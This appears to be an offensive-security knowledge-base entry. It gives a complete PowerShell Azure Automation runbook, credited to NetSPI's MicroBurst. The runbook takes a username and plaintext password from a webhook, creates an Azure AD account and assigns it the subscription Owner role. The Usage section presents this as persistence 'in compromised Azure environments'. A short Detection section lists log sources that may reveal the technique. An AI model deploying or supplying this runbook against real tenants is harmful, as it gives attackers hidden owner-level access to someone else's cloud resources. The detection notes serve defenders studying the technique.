---
id: 5e367630-8260-4d88-bcc0-5be44edffb31
name: Azure-Automation-Runbook-User-Creation-Script
type: code
language: powershell
verified: true
created_at: '2023-05-25T03:23:29.834573+00:00'
updated_at: '2023-05-25T03:23:29.850067+00:00'
platforms:
  - Azure
tags:
  - cloud-azure
  - persistence
  - runbook
  - user-creation
validated: true
---

# Azure-Automation-Runbook-User-Creation-Script

## Code

```powershell
# runbook.ps1
# NetSPI - https://github.com/NetSPI/MicroBurst/blob/master/Misc/AutomationRunbook-OwnerPersist.ps1
# Automation Runbook Owner Persistence

param
(
    [Parameter (Mandatory = $false)]
    [object] $WebhookData
)

import-module AzureAD

# Get Azure Run As Connection Name
$connectionName = "AzureRunAsConnection"

# Get the Service Principal connection details for the Connection name
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName         

# Logging in to Azure AD with Service Principal
$azureADConnection = Connect-AzureAD -TenantId $servicePrincipalConnection.TenantId `
    -ApplicationId $servicePrincipalConnection.ApplicationId `
    -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint

# Ensures you do not inherit an AzureRMContext in your runbook
Disable-AzureRmContextAutosave -Scope Process | out-null

# Logging in to Azure RM with Service Principal
$azureRMConnection = Connect-AzureRmAccount -ServicePrincipal -Tenant $servicePrincipalConnection.TenantID `
    -ApplicationID $servicePrincipalConnection.ApplicationID `
    -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint

$AzureContext = Select-AzureRmSubscription -SubscriptionId $servicePrincipalConnection.SubscriptionID

# Setup Password Object
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile

# Read Webhook data
if($WebhookData -ne $null){

    $BodyContent = ($WebhookData.RequestBody | ConvertFrom-Json)

    # Retrieve Username from Webhook request body
    if ($BodyContent.RequestBody.Username -ne $null){$UPN = ($BodyContent.RequestBody.Username)+'@'+$azureADConnection.TenantDomain}

    # Retrieve Password from Webhook request body    
    if ($BodyContent.RequestBody.Password -ne $null){$PasswordProfile.Password = $BodyContent.RequestBody.Password}
}
else{exit;}
    

# Add New AzureAD Account
New-AzureADUser -DisplayName $BodyContent.RequestBody.Username -PasswordProfile $PasswordProfile -UserPrincipalName $UPN -AccountEnabled $true -MailNickName $BodyContent.RequestBody.Username

# Add account to Owners Group
New-AzureRmRoleAssignment -SignInName $UPN -RoleDefinitionName Owner
```

## Description

This PowerShell script is designed as an Azure Automation Runbook to create a new Azure AD user and assign it the Owner role when triggered by a webhook. It uses the built-in Azure Run As service principal for authentication, parses the incoming webhook JSON for username and password, constructs the user principal name using the tenant domain, and executes the creation and role assignment. If no valid webhook data is provided, the script exits without action.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $WebhookData | Incoming webhook object containing RequestBody with Username and Password | {"RequestBody":{"Username":"NewUser","Password":"Pass123"}} |
| $BodyContent.RequestBody.Username | Desired username for the new account (UPN appended with tenant domain) | NewAzureOwnerAccount |
| $BodyContent.RequestBody.Password | Plaintext password for the new account | Password123 |

## Usage

Save as runbook.ps1 and import into an Azure Automation Account (see [[procedures/Azure-Automation-Account-Runbook-Persistence]]). Configure a webhook on the published Runbook. Trigger via POST to the webhook URI with JSON payload. The script runs in the Automation sandbox; no local execution needed post-setup. Use for persistence in compromised Azure environments.

## Detection

- Azure Activity Logs: Look for Runbook executions, New-AzureADUser calls, and New-AzureRmRoleAssignment to Owner role from service principal IPs.
- Azure AD Audit Logs: Anomalous user creations with simple passwords or from automation contexts.
- Webhook invocation logs: Unusual POST requests to Automation endpoints.
- Defender for Cloud alerts on privilege escalations via service principals.

## Related

- [[procedures/Azure-Automation-Account-Runbook-Persistence]]
- [[commands/curl-trigger-azure-webhook]]
